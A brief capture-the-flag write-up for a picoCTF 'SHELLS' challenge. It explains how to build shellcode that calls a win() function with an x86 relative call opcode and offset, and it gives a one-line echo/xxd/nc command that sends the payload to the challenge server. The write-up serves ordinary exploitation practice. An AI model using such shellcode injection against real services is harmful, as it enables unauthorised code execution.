# SHELLS
## Solution
Here we inject the shellcode which call win()

the code for the call instruction is e8
followed by the offset to the address to be called, calculated from the address of the nex instruction


First we find out the address of stuff,
then the offset is calculated as
*win - (*stuff + 5)
(remember to put the offset value in little endian order)

echo -e 'e83b250710' | xxd -r -p | nc shell2017.picoctf.com 40976